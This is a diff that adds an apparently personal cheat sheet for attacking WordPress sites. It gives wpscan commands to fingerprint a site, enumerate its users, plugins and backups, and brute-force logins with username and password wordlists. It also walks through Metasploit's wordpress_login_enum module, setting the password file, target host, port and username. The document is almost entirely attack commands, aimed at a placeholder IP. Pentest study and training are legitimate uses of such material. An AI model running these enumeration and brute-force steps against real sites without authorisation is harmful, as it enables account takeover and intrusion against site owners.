@@ -1,1 +1,31 @@
+WPSCAN
+**********************************************
+wpscan --url https://domain.com
 
+wpscan --url ip
+# will show header, version of php, server, policy implemented, robot.txt, xml-rpc (for xss), word press version, theme, it will enumerate plugins, enumerating backups
+
+wpscan --url http://domain.com -e u
+# it will enumerate users
+
+# Brute Force using WPscan    
+wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt 
+wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt --passwords passwdlist.txt 
+wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt --passwords /home/root9/passwdlist.txt 
+
+Enumerate a Web Application using WPscan & Metasploit BFA-  
+*********************************************************************************
+  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username) 
+# Then type 
+  msfconsole 
+# to open metasploit. 
+# Type   
+  use auxilliary/scanner/http/wordpress_login_enum
+#(if above didn't work, enter use wordpress)
+
+ show options
+ set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
+ set RHOSTS 10.10.10.10  (target ip)
+ set RPORT 8080          (target port)
+ set TARGETURI http://10.10.10.10:8080/
+ set USERNAME admin
